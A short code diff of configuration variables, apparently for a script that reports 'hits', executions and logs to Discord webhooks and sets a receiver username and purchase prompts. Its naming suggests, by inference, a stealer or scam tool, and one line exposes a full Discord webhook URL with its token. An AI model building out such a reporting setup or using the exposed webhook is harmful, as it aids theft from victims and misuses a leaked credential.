@@ -1,4 +1,6 @@
-ExecutionsWebhook = ""
+Receiver_Username = Username
+HitsWebhook = Webhook
+Executions_Webhook = ExecutionsWebhook
 Purchase_Prompt = ""
 Button_Prompt = ""
 LogsWebhook = "https://discord.com/api/webhooks/1343102902721577020/qgqrcXyabx7RMKRc3lWQn8oRy_32GfHGXjxm8hV_-P9wsi3mCGGuyk_VtkEpfKtm8zoH"
